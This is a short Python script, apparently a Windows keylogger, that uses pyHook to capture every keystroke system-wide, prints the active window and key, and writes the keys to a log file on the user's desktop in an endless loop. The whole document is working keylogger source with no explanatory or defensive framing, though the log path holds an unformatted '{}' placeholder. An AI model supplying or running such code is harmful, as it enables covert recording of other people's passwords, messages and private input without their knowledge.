import pyHook, pythoncom, sys, logging, time , datetime

carpeta_destino='C:\\users\\{}\\Desktop\\Keylogger2\\Keylogger2.txt'

def OnKeyboardEvent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
    print('WindowName:',event.WindowName)
    print('Window:',event.Window)
    print('key:',event.key)
    
    logging.log(10,event.key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown= OnKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()
